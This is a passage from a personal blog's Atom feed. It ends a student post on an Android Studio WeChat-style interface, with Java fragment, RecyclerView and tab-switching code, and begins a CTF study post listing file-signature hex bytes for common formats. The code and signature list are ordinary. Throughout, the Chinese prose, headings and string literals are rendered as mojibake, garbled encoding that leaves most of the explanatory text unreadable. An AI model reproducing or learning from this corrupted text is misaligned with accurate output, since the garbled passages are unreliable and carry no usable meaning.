list.add(<span class="hljs-string">"ç½‘å‹5:å¸¸æç§‹èŠ‚è‡³"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹6:ç„œé»„åå¶è¡°"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹7:ç™¾å·ä¸œåˆ°æµ·"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹8:ä½•æ—¶å¤è¥¿å½’"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹9:å°‘å£®ä¸åŠªåŠ›"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹10:è€å¤§å¾’ä¼¤æ‚²"</span>);<br>    }<br></code></pre></td></tr></tbody></table></figure><p>åˆ›å»ºä¸€ä¸ª<code>LinearLayoutManager</code>å¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™<code>manager</code>å˜é‡ã€‚ç„¶åé€šè¿‡è°ƒç”¨<code>setOrientation(LinearLayoutManager.VERTICAL)</code>æ–¹æ³•ï¼Œå°†å¸ƒå±€æ–¹å‘è®¾ç½®ä¸ºå‚ç›´æ–¹å‘ã€‚</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>    manager.setOrientation(LinearLayoutManager.VERTICAL);<br></code></pre></td></tr></tbody></table></figure><p><code>myadapter = new Myadapter(context, list);</code> åˆ›å»ºä¸€ä¸ªåä¸º<code>myadapter</code>çš„è‡ªå®šä¹‰é€‚é…å™¨å¯¹è±¡ï¼Œå¹¶ä¼ å…¥<code>context</code>å’Œ<code>list</code>ä½œä¸ºå‚æ•°è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>recyclerView.setAdapter(myadapter);<code> å°†åˆ›å»ºçš„é€‚é…å™¨å¯¹è±¡</code>myadapter<code>è®¾ç½®ç»™</code>recyclerView<code>ï¼Œç”¨äºæ˜¾ç¤ºæ•°æ®ã€‚</code>recyclerView.setLayoutManager(manager);<code> å°†ä¹‹å‰åˆ›å»ºçš„å¸ƒå±€ç®¡ç†å™¨</code>manager<code>è®¾ç½®ç»™</code>recyclerViewï¼Œç”¨äºæ§åˆ¶åˆ—è¡¨çš„å¸ƒå±€æ–¹å¼ã€‚</p><p>return view;<code> è¿”å›åŒ…å«</code>recyclerViewçš„è§†å›¾å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>    recyclerView.setAdapter(myadapter);<br>    recyclerView.setLayoutManager(manager);<br>    recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>    <span class="hljs-keyword">return</span> view;<br></code></pre></td></tr></tbody></table></figure><h4 id="ltfragmentå…¨éƒ¨ä»£ç å±•ç¤º"><a href="#ltfragmentå…¨éƒ¨ä»£ç å±•ç¤º" class="headerlink" title="ltfragmentå…¨éƒ¨ä»£ç å±•ç¤º"></a>ltfragmentå…¨éƒ¨ä»£ç å±•ç¤º</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.DividerItemDecoration;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A simple {<span class="hljs-doctag">@link</span> Fragment} subclass.</span><br><span class="hljs-comment"> * Use the {<span class="hljs-doctag">@link</span> ltFragment#newInstance} factory method to</span><br><span class="hljs-comment"> * create an instance of this fragment.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ltFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename parameter arguments, choose names that match</span><br>    <span class="hljs-comment">// the fragment initialization parameters, e.g. ARG_ITEM_NUMBER</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ARG_PARAM1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"param1"</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ARG_PARAM2</span> <span class="hljs-operator">=</span> <span class="hljs-string">"param2"</span>;<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types of parameters</span><br>    <span class="hljs-keyword">private</span> String mParam1;<br>    <span class="hljs-keyword">private</span> String mParam2;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Use this factory method to create a new instance of</span><br><span class="hljs-comment">     * this fragment using the provided parameters.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param1 Parameter 1.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> param2 Parameter 2.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> A new instance of fragment ltFragment.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Rename and change types and number of parameters</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ltFragment <span class="hljs-title function_">newInstance</span><span class="hljs-params">(String param1, String param2)</span> {<br>        <span class="hljs-type">ltFragment</span> <span class="hljs-variable">fragment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ltFragment</span>();<br>        <span class="hljs-type">Bundle</span> <span class="hljs-variable">args</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bundle</span>();<br>        args.putString(ARG_PARAM1, param1);<br>        args.putString(ARG_PARAM2, param2);<br>        fragment.setArguments(args);<br>        <span class="hljs-keyword">return</span> fragment;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ltFragment</span><span class="hljs-params">()</span> {<br>        <span class="hljs-comment">// Required empty public constructor</span><br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-keyword">if</span> (getArguments() != <span class="hljs-literal">null</span>) {<br>            mParam1 = getArguments().getString(ARG_PARAM1);<br>            mParam2 = getArguments().getString(ARG_PARAM2);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> RecyclerView recyclerView;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; list;<br>    <span class="hljs-keyword">private</span> Context context;<br>    <span class="hljs-keyword">private</span> Myadapter myadapter;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                             Bundle savedInstanceState)</span> {<br>        View view=inflater.inflate(R.layout.fragment_lt,container,<span class="hljs-literal">false</span>);<br>        context=view.getContext();<br>        recyclerView=view.findViewById(R.id.recyclerview);<br>        list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        initData();<br><br>        LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br><br>        manager.setOrientation(LinearLayoutManager.VERTICAL);<br><br>        myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>        recyclerView.setAdapter(myadapter);<br><br>        recyclerView.setLayoutManager(manager);<br><br><br>        recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>        <span class="hljs-keyword">return</span> view;<br><br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-comment">//return inflater.inflate(R.layout.fragment_lt, container, false);</span><br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initData</span><span class="hljs-params">()</span>{<br>        list.add(<span class="hljs-string">"ç½‘å‹1:é’é’å›­ä¸­è‘µ"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹2:æœéœ²å¾…æ—¥æ™"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹3:é˜³æ˜¥å¸ƒå¾·æ³½"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹4:ä¸‡ç‰©ç”Ÿå…‰è¾‰"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹5:å¸¸æç§‹èŠ‚è‡³"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹6:ç„œé»„åå¶è¡°"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹7:ç™¾å·ä¸œåˆ°æµ·"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹8:ä½•æ—¶å¤è¥¿å½’"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹9:å°‘å£®ä¸åŠªåŠ›"</span>);<br>        list.add(<span class="hljs-string">"ç½‘å‹10:è€å¤§å¾’ä¼¤æ‚²"</span>);<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="MainActivity-javaå…¨éƒ¨å†…å®¹å±•ç¤º"><a href="#MainActivity-javaå…¨éƒ¨å†…å®¹å±•ç¤º" class="headerlink" title="MainActivity.javaå…¨éƒ¨å†…å®¹å±•ç¤º"></a>MainActivity.javaå…¨éƒ¨å†…å®¹å±•ç¤º</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentManager;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentTransaction;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener{<br>    Fragment fragment1,fragment2,fragment3,fragment4;<br>    FragmentManager fm;<br>    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.main);<br>        fragment1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ltFragment</span>();<br>        fragment2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">txlFragment</span>();<br>        fragment3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">findFragment</span>();<br>        fragment4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">wdFragment</span>();<br>        fm = getSupportFragmentManager();<br><br>        linearLayout1 = findViewById(R.id.id_tab_wx);<br>        linearLayout2 = findViewById(R.id.id_tab_friend);<br>        linearLayout3 = findViewById(R.id.id_tab_address);<br>        linearLayout4 = findViewById(R.id.id_tab_setting);<br><br>        inital();<br>        fragmenthide();<br>        fragmentshow(fragment1);<br>        linearLayout1.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout2.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout3.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        linearLayout4.setOnClickListener(<span class="hljs-built_in">this</span>);<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmenthide</span><span class="hljs-params">()</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .hide(fragment1)<br>                .hide(fragment2)<br>                .hide(fragment3)<br>                .hide(fragment4);<br>        ft.commit();<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inital</span><span class="hljs-params">()</span> {<br><br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .add(R.id.content,fragment1)<br>                .add(R.id.content,fragment2)<br>                .add(R.id.content,fragment3)<br>                .add(R.id.content,fragment4);<br>        ft.commit();<br><br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>        fragmenthide();<br>        <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_wx){<br>            fragmentshow(fragment1);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_friend){<br>            fragmentshow(fragment2);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_address){<br>            fragmentshow(fragment3);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(view.getId()==R.id.id_tab_setting){<br>            fragmentshow(fragment4);<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmentshow</span><span class="hljs-params">(Fragment fragment)</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .show(fragment);<br>        transaction.commit();<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="ç»“æœå±•ç¤º"><a href="#ç»“æœå±•ç¤º" class="headerlink" title="ç»“æœå±•ç¤º"></a>ç»“æœå±•ç¤º</h2><p class='item-img' data-src='https://s2.loli.net/2023/10/13/XFIxLtsQfOSbnVc.png'><img src="https://s2.loli.net/2023/10/13/XFIxLtsQfOSbnVc.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/pZ5ct8yXLPAS3Nw.png'><img src="https://s2.loli.net/2023/10/13/pZ5ct8yXLPAS3Nw.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/82PfDyF6CNcqAp9.png'><img src="https://s2.loli.net/2023/10/07/82PfDyF6CNcqAp9.png" alt="Snipaste_2023-10-07_21-10-09.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/ty19qzgMbTcK4l5.png'><img src="https://s2.loli.net/2023/10/07/ty19qzgMbTcK4l5.png" alt="Snipaste_2023-10-07_21-10-13.png"></p><h2 id="ä»£ç ä»“åº“"><a href="#ä»£ç ä»“åº“" class="headerlink" title="ä»£ç ä»“åº“"></a>ä»£ç ä»“åº“</h2><p><a href="https://github.com/Kylinxin/MyWork"></a><a href="https://github.com/Kylinxin/MyWork">Kylinxin/MyWork: ç±»å¾®ä¿¡ç•Œé¢æºä»£ç  (github.com)</a></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åˆ©ç”¨asè¿›è¡Œç§»åŠ¨å¼€å‘å®ç°äº†ä¸€ä¸ªç®€å•çš„ç±»å¾®ä¿¡çš„ç•Œé¢è®¾è®¡ï¼ŒåŠ å¼ºäº†æˆ‘å¯¹asçš„fragmentã€åŸºæœ¬layoutã€recycleviewçš„è®¤çŸ¥ï¼Œä»¥åŠå¯¹xmlæ–‡ä»¶è¿›è¡Œç•Œé¢ç¼–å†™éƒ¨åˆ†ä»¥åŠå¯¹ç›¸å…³çš„æ§ä»¶æœ‰äº†æ›´æ·±å…¥çš„äº†è§£ï¼Œèƒ½å¤Ÿè®¾è®¡åŸºç¡€UIç•Œé¢ï¼Œå®ç°ç•Œé¢è·³è½¬åŠŸèƒ½ä»¥åŠåœ¨fragmenté‡Œé¢è°ƒç”¨recycleviewå®ç°åˆ—è¡¨åŠŸèƒ½ï¼Œç»™æˆ‘æä¾›äº†ä¸€å®šçš„æ€è·¯è¿›è¡ŒåŠŸèƒ½å’Œç•Œé¢ç›¸äº’è¿æ¥çš„ä»£ç çš„ç¼–å†™ã€‚åœ¨è¿™æ¬¡çš„å®éªŒä¸‹æˆ‘ä¹Ÿå¯¹ASè¿™æ¬¾è½¯ä»¶è¿›è¡Œäº†ç†Ÿæ‚‰ï¼Œå¯¹äºå…¶æè¯å™¨çš„å¼ºå¤§æœ‰äº†å¾ˆæ·±çš„å°è±¡ã€‚</p><p>â€‹â€”â€”2023.10.13</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&quot;&gt;&lt;a href=&quot;#ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&quot; class=&quot;headerlink&quot; title=&quot;ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&quot;&gt;&lt;/a&gt;ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&lt;/h1&gt;&lt;h2 id=&quot;åŠŸèƒ½è¦æ±‚&quot;&gt;&lt;a href=&quot;#åŠŸèƒ½è¦æ±‚&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="å®éªŒ" scheme="https://kylinxin.github.io/categories/%E5%AE%9E%E9%AA%8C/"/>
    
    
    <category term="ç§»åŠ¨å¼€å‘å®éªŒ" scheme="https://kylinxin.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯æ€»ç»“ CTFä¸­Miscå¿…å¤‡</title>
    <link href="https://kylinxin.github.io/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/"/>
    <id>https://kylinxin.github.io/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/</id>
    <published>2023-09-27T15:14:29.000Z</published>
    <updated>2023-09-30T09:14:29.172Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯æ€»ç»“-CTFä¸­Miscå¿…å¤‡"><a href="#å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯æ€»ç»“-CTFä¸­Miscå¿…å¤‡" class="headerlink" title="å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯æ€»ç»“ CTFä¸­Miscå¿…å¤‡"></a><strong>å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯æ€»ç»“ CTFä¸­Miscå¿…å¤‡</strong></h2><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h3><p>å¯¹å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯åšä¸ªå½’çº³æ€»ç»“</p><ul><li>æ–‡ä»¶å¤´æ–‡ä»¶å°¾</li><li>å›¾ç‰‡éšå†™</li><li>éŸ³é¢‘éšå†™</li><li>ç”µå­æ–‡æ¡£éšå†™</li></ul><h3 id="ä¸€ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾"><a href="#ä¸€ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾" class="headerlink" title="ä¸€ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾"></a><strong>ä¸€ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾</strong></h3><h4 id="1ã€å›¾ç‰‡"><a href="#1ã€å›¾ç‰‡" class="headerlink" title="1ã€å›¾ç‰‡"></a><strong>1ã€å›¾ç‰‡</strong></h4><ul><li>JPEG æ–‡ä»¶å¤´ï¼š<code>FF D8 FF</code>  æ–‡ä»¶å°¾ï¼š<code>FF D9</code></li><li>TGA æœªå‹ç¼©çš„å‰4å­—èŠ‚ <code>00 00 02 00</code> RLEå‹ç¼©çš„å‰5å­—èŠ‚ <code>00 00 10 00 00</code></li><li>PNG æ–‡ä»¶å¤´ï¼š<code>89 50 4E 47 0D 0A 1A 0A</code>  æ–‡ä»¶å°¾ï¼š<code>AE 42 60 82</code></li><li>GIF æ–‡ä»¶å¤´ï¼š<code>47 49 46 38 39(37) 61</code>  æ–‡ä»¶å°¾ï¼š<code>00 3B</code></li><li>BMP æ–‡ä»¶å¤´ï¼š<code>42 4D</code> æ–‡ä»¶å¤´æ ‡è¯†(2 bytes) 42(B) 4D(M)</li><li>TIFF (tif) æ–‡ä»¶å¤´ï¼š<code>49 49 2A 00</code></li><li>ico æ–‡ä»¶å¤´ï¼š<code>00 00 01 00</code></li><li>Adobe Photoshop (psd) æ–‡ä»¶å¤´ï¼š<code>38 42 50 53</code></li></ul><h4 id="2ã€officeæ–‡ä»¶"><a href="#2ã€officeæ–‡ä»¶" class="headerlink" title="2ã€officeæ–‡ä»¶"></a><strong>2ã€officeæ–‡ä»¶</strong></h4><ul><li>MS Word/Excel (xls.or.doc) æ–‡ä»¶å¤´ï¼š<code>D0 CF 11 E0</code></li><li>MS Access (mdb) æ–‡ä»¶å¤´ï¼š<code>53 74 61 6E 64 61 72 64 20 4A</code></li><li>WordPerfect (wpd) æ–‡ä»¶å¤´ï¼š<code>FF 57 50 43</code></li><li>Adobe Acrobat (pdf) æ–‡ä»¶å¤´ï¼š<code>25 50 44 46 2D 31 2E</code></li><li>application/vnd.visio(vsd) æ–‡ä»¶å¤´ï¼š<code>D0 CF 11 E0 A1 B1 1A E1</code></li><li>Email [thorough only] (eml) æ–‡ä»¶å¤´ï¼š<code>44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</code></li><li>Outlook Express (dbx) æ–‡ä»¶å¤´ï¼š<code>CF AD 12 FE C5 FD 74 6F</code></li><li>Outlook (pst) æ–‡ä»¶å¤´ï¼š<code>21 42 44 4E</code></li><li>Rich Text Format (rtf) æ–‡ä»¶å¤´ï¼š<code>7B 5C 72 74 66</code></li><li>txt æ–‡ä»¶(txt) æ–‡ä»¶å¤´ï¼šUnicodeï¼š<code>FE FF</code> / Unicode big endianï¼š<code>FF FE</code> / UTF-8ï¼š<code>EF BB BF</code> /ANSIç¼–ç æ˜¯æ²¡æœ‰æ–‡ä»¶å¤´çš„</li></ul><h4 id="3ã€å‹ç¼©åŒ…æ–‡ä»¶"><a href="#3ã€å‹ç¼©åŒ…æ–‡ä»¶" class="headerlink" title="3ã€å‹ç¼©åŒ…æ–‡ä»¶"></a><strong>3ã€å‹ç¼©åŒ…æ–‡ä»¶</strong></h4><ul><li>ZIP Archive (zip) æ–‡ä»¶å¤´ï¼š<code>50 4B 03 04</code> æ–‡ä»¶å°¾ï¼š<code>50 4B</code></li><li>RAR Archive (rar) æ–‡ä»¶å¤´ï¼š<code>52 61 72 21</code></li></ul><h4 id="4ã€éŸ³é¢‘æ–‡ä»¶"><a href="#4ã€éŸ³é¢‘æ–‡ä»¶" class="headerlink" title="4ã€éŸ³é¢‘æ–‡ä»¶"></a><strong>4ã€éŸ³é¢‘æ–‡ä»¶</strong></h4><ul><li>Wave (wav) æ–‡ä»¶å¤´ï¼š<code>57 41 56 45</code></li><li>audio(Audio) æ–‡ä»¶å¤´ï¼š <code>4D 54 68 64</code></li><li>audio/x-aacï¼ˆaacï¼‰</li><li>æ–‡ä»¶å¤´ï¼š<code>FF F1(9)</code></li></ul><h4 id="5ã€è§†é¢‘æ–‡ä»¶"><a href="#5ã€è§†é¢‘æ–‡ä»¶" class="headerlink" 